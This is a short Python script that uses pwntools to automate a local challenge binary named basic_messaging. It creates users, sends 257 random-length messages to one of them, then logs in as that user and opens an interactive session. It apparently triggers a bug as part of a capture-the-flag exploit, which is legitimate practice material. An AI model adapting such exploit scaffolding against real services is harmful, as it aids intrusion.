#!/usr/bin/env python
from pwn import *

MSG_MAX_LEN = 0x20
USERNAME_MAX_LEN= 0x10

def create_user(p, username) :
    p.recvuntil("1) Create User")
    p.recvuntil(":")
    p.sendline(str(1))
    p.recvuntil("username:")
    p.sendline(username)

def login_as_user(p, username) :
    p.recvuntil("1) Create User")
    p.recvuntil(":")
    p.sendline(str(2))
    p.recvuntil("username:")
    p.sendline(username)

def logout(p) :
    p.recvuntil("5) Logout")
    p.recvuntil(":")
    p.sendline(str(5))

def send_msg_to_user(p, to, msg) :
    p.recvuntil("1) Send Message")
    p.recvuntil(":")
    p.sendline(str(1))
    p.recvuntil("To:")
    p.sendline(to)
    p.recvuntil("Message:")
    p.sendline(msg)

def exit_while_logged_in(p) :
    p.recvuntil("6) Exit")
    p.recvuntil(":")
    p.sendline(str(6))


first_user = "userone"
second_user= "usertwo"



p = process("./basic_messaging")

## create all users
create_user(p, first_user)
create_user(p, second_user)

## REDUNDANT
create_user(p, "hahaha")
create_user(p, "hehehe")
login_as_user(p, "hahaha")
logout(p)



## login as first_user
login_as_user(p, first_user)

## s
for i in range(0, 257) :
    msg_len = randint(1, MSG_MAX_LEN - 2)
    message = "q" * msg_len
    send_msg_to_user(p, second_user, message)

## logout
logout(p)

login_as_user(p, second_user)
p.interactive()
